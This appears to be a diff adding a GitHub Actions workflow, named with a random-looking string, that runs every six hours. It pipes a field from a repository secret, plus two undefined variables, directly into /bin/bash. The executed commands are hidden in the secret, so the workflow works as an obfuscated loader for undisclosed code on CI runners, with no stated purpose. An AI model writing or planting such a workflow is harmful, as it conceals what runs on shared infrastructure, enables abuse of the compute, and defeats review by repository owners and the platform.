@@ -1,0 +1,19 @@
+name: hongqigong6725
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongqigong6725
+        env:
+          pp3: ${{ secrets.pp3 }}
+        run: |
+          echo $pp3 | jq -r .eydjm84918 | /bin/bash
+          echo $kxxvh85 | jq -r .qjavo4842 | /bin/bash
+          echo $a8 | jq -r .qvxip8 | /bin/bash
+
